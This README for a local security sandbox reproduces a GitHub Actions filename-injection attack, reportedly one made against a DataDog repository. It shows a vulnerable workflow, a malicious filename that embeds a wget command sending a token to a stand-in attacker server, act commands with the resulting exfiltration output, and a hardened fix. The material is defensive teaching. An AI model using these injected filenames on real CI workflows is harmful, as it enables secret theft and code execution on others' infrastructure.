# 🔐 Sandbox 4 - Filename Injection (DataDog/datadog-iac-scanner)

## 📋 Overview

| Property | Value |
|----------|-------|
| **Attack Type** | Filename injection via unsanitized `${{ }}` in `for` loop |
| **Real Target** | DataDog/datadog-iac-scanner |
| **Attacker** | hackerbot-claw (Feb 27, 2026) |
| **Trigger** | `issue_comment` on Pull Request |
| **Result** | ❌ RCE via command substitution in filename |
| **Fixed** | ✅ Attack blocked with `author_association` + safe `while` loop |

> 💡 **Note:** This attack is similar to Sandbox 3 but the payload is hidden
> inside a **filename** instead of a comment body.
> The `for` loop iterates over filenames - if a filename contains `$(...)`,
> bash executes it as a command substitution.

---

## 📁 Structure
```
sandbox-4-filename-injection/
│
├── vulnerable/                          ← ATTACKED VERSION
│   └── .github/
│       └── workflows/
│           └── sync-metadata.yml       ← vulnerable workflow
│
├── fixed/                               ← SECURED VERSION
│   └── .github/
│       └── workflows/
│           └── sync-metadata.yml       ← hardened workflow
│
└── attacker/
    └── PAYLOAD_EXPLANATION.md          ← malicious filename explained
```

---

## 🔄 Attack Flow

### Visual Diagram
```
┌──────────────────────────────────────────────────────────┐
│                      ATTACK FLOW                          │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   1. Attacker creates file with malicious name:           │
│      docs/$(wget http://localhost:8888/exfil).md          │
│                    ↓                                      │
│   2. Attacker comments "/sync-metadata" on PR             │
│      ⚠️  ANY user can trigger - no author check           │
│                    ↓                                      │
│   3. issue_comment trigger fires                          │
│                    ↓                                      │
│   4. Workflow iterates over filenames:                    │
│      for file in ${{ steps.get_files.outputs.files }}     │
│      ⚠️  filename injected directly into bash for loop    │
│                    ↓                                      │
│   5. bash evaluates $( ) in filename                      │
│      wget executes → data sent to attacker server         │
│                    ↓                                      │
│   ❌ RCE via filename command substitution                │
│                                                           │
├──────────────────────────────────────────────────────────┤
│                       THE FIX                             │
├──────────────────────────────────────────────────────────┤
│                                                           │
│   Store filenames in env variable first                   │
│   Use safe while IFS= read -r loop                        │
│   ✅ bash NEVER executes $(...) in variable values        │
│                    ↓                                      │
│   ✅ Attack blocked                                       │
│                                                           │
└──────────────────────────────────────────────────────────┘
```

### Simplified Diagram
```
Malicious filename: docs/$(wget http://attacker/exfil).md
           ↓
/sync-metadata comment triggers workflow (no author check ⚠️)
           ↓
for file in ${{ steps.get_files.outputs.files }}
           ↓                    ↑
bash sees $(...) ──── EXECUTES IT
           ↓
wget → localhost:8888/exfil
           ↓
❌ Data exfiltrated
```

---

## ⚠️ Vulnerability Conditions

Two conditions must be met simultaneously:
```yaml
# ⚠️ Condition 1: no author_association check
# CRITICAL: ANY GitHub user can trigger this
# by commenting "/sync-metadata" on any PR
jobs:
  sync:
    if: contains(github.event.comment.body, '/sync-metadata')
    # ← MISSING: author_association check

# ⚠️ Condition 2: ${{ }} interpolated directly in for loop
steps:
  - name: Process metadata files
    run: |
      # DANGER: filenames injected directly into bash for loop
      # if filename contains $(...), bash WILL execute it
      for file in ${{ steps.get_files.outputs.files }}; do
      #            ↑
      #   CRITICAL VULNERABILITY HERE
        echo "Processing $file"
      done
```

---

## 💣 Malicious Payload

The attacker creates a file with a **command substitution embedded in its name**:
```bash
# Malicious filename:
docs/$(wget -q -O- --post-data="token=EXFILTRATED_TOKEN" http://attacker-server/exfil).md
#     ↑
#   $(...) - bash will execute this when iterating filenames

# What bash evaluates in the for loop:
for file in docs/$(wget -q -O- --post-data="token=EXFILTRATED_TOKEN" http://attacker-server/exfil).md
#                  ↑
#   CRITICAL: bash executes wget here - token exfiltrated
```

> 💡 **Why is this effective?**
> The `${{ }}` expression injects the **raw filename** into a bash `for` loop.
> Bash sees `$(...)` inside the filename and executes it as a **command substitution**.
> The real attack showed a **~2.5 minute gap** in the build log -
> DataDog deployed emergency fixes within **9 hours** of the attack.

> 🔑 **Comparison with Sandbox 3:**
> - Sandbox 3 → payload in **comment body** → executed via `echo`
> - Sandbox 4 → payload in **filename** → executed via `for` loop
> Same vulnerability, different attack surface.

---

## 🔒 Why `while IFS= read -r` Blocks the Attack

> 💡 **This is the key security concept of this sandbox:**
```
VULNERABLE - bash evaluates filenames as commands:
──────────────────────────────────────────────────
for file in ${{ steps.get_files.outputs.files }}; do
#            ↑
# bash receives: for file in docs/$(wget http://attacker/exfil).md
# bash sees $(...) → EXECUTES wget → ❌ RCE


SAFE - bash treats filenames as plain text:
──────────────────────────────────────────────────
env:
  FILES: ${{ steps.get_files.outputs.files }}
run: |
  while IFS= read -r file; do
    echo "Processing $file"
  done <<< "$FILES"
# ↑
# bash reads $FILES as a plain string
# $(...) inside FILES is NEVER executed → ✅ Safe
```

> 🔑 **The rule:** `while IFS= read -r` reads input **line by line as plain text**.
> It never interprets `$(...)` as commands.
> The `for` loop with direct `${{ }}` injection is the vulnerability -
> **always use `while IFS= read -r` for safe file iteration.**

---

## 📄 Event JSON

> 💡 **What is the Event JSON?**
> When running locally with `act`, we simulate a GitHub event using a JSON file.
> The `event_filename_injection.json` mimics a **PR comment** from an
> **untrusted external user** (`author_association: NONE`) posting
> `/sync-metadata` to trigger the vulnerable workflow.
```json
{
  "action": "created",
  "issue": {
    "number": 1,
    "pull_request": {
      "url": "https://api.github.com/repos/owner/repo/pulls/1"
    }
  },
  "comment": {
    "body": "/sync-metadata",
    "author_association": "NONE"
  },
  "repository": {
    "full_name": "owner/repo"
  }
}
```

---

## 🧪 Local Demonstration

> ⚠️ **Safety Disclaimer:**
> This demonstration runs **entirely locally** using `act` and Docker.
> `localhost:8888` is a **simulated exfiltration server** on your own machine.
> **No real data is sent anywhere outside your machine.**
> Never run these attacks against real repositories without explicit authorization.

### Step 1 - Start exfiltration server
```bash
# Terminal 2 - keep this running
python exfil_server.py

# Expected output:
# Exfiltration server running on port 8888...
```

### Step 2 ❌ - Run Vulnerable Version
```bash
# Terminal 1
act issue_comment \
    --eventpath event_filename_injection.json \
    --secret-file .secrets \
    -W sandbox-4-filename-injection/vulnerable/.github/workflows/sync-metadata.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token
```

**Terminal 1 - victim sees nothing suspicious:**
```
✅ Success - Main Process metadata files
🏁 Job succeeded
```

**Terminal 2 - attacker receives the data:**
```
==================================================
TOKEN EXFILTRATED!
Data: token=EXFILTRATED_TOKEN
==================================================
❌ Attack succeeded - filename command substitution executed
```

### Step 3 ✅ - Run Fixed Version
```bash
act issue_comment \
    --eventpath event_filename_injection.json \
    --secret-file .secrets \
    -W sandbox-4-filename-injection/fixed/.github/workflows/sync-metadata.yml \
    -P ubuntu-latest=catthehacker/ubuntu:act-latest \
    -s GITHUB_TOKEN=$token -v
```

**Terminal 1 - job blocked immediately:**
```
expression evaluated to 'false'
Skipping job 'sync'
author_association == NONE - not MEMBER or OWNER
✅ Job skipped - attacker blocked
```

**Terminal 2:**
```
(no request received)
✅ Attack blocked - nothing exfiltrated
```

---

## 🛠️ Applied Fix

| Element | ❌ Vulnerable | ✅ Fixed |
|---------|-------------|---------|
| Trigger | Any user via comment | `MEMBER`/`OWNER` only |
| `author_association` | Not checked | Verified |
| File iteration | `${{ }}` in `for` loop | Stored in `env` + `while` loop |
| Bash evaluation | `$(...)` executed | Treated as plain text |
```yaml
# ✅ FIXED WORKFLOW
jobs:
  sync:
    if: |
      contains(github.event.comment.body, '/sync-metadata') &&
      (github.event.comment.author_association == 'MEMBER' ||
       github.event.comment.author_association == 'OWNER')
      # ✅ CRITICAL: only trusted users can trigger

    permissions:
      contents: read

    steps:
      - name: Process metadata files
        env:
          # ✅ store filenames in env variable first
          FILES: ${{ steps.get_files.outputs.files }}
        run: |
          # ✅ while IFS= read -r treats filenames as plain text
          # bash NEVER executes $(...) inside variable values
          while IFS= read -r file; do
            echo "Processing $file"
          done <<< "$FILES"
```

---

## 🔑 Key Lesson

> ⚠️ **Never use `${{ }}` expressions directly inside `for` loops.**
>
> Filenames are **attacker-controlled values** - they can contain
> `$(...)` command substitution payloads that bash will execute.
>
> ✅ **Rule 1:** Always store file lists in `env` variables first.
>
> ✅ **Rule 2:** Always use `while IFS= read -r file` for safe iteration.
> It reads filenames as **plain text** - `$(...)` is never executed.
>
> 🔑 **Remember:** A filename is **untrusted input**.
> Never assume a filename is safe to iterate directly in bash.

---

## 🔗 References

- [Real attack analysis - StepSecurity](https://www.stepsecurity.io/blog/hackerbot-claw-github-actions-exploitation)
- [GitHub Actions expression injection](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#understanding-the-risk-of-script-injections)
- [act - Local GitHub Actions runner](https://github.com/nektos/act)
